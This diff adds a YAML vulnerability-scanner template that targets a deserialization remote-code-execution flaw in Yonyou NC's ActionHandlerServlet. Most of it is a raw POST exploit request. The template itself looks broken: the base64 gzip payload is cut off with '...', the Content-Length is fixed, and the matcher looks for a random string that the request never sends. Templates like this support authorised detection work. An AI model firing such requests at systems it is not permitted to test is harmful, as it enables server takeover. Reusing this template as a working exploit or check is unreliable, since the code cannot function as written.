@@ -1,0 +1,33 @@
+id: yonyou-nc-rce
+info:
+  name: Yonyou NC ActionHandlerServlet Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Yonyou NC Cloud contains a deserialization vulnerability in the ActionHandlerServlet API, allowing attackers to execute arbitrary code on the server. This vulnerability can lead to backdoor installation, server compromise, and full control of the web server.
+  tags: rce, deserialization, critical
+  reference:
+    - http://www.yonyougz.com/yonyou/yonyou-nc/
+
+variables:
+  random_string: "{{rand_text_alphanumeric(10)}}"
+
+http:
+  - raw:
+      - |
+        POST /servlet/~ic/com.ufida.zior.console.ActionHandlerServlet HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/octet-stream
+        Content-Length: 1024
+
+        {{base64_decode('H4sIAAAAAAAA/3JIzcnJBw...')}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{random_string}}"
+        part: body
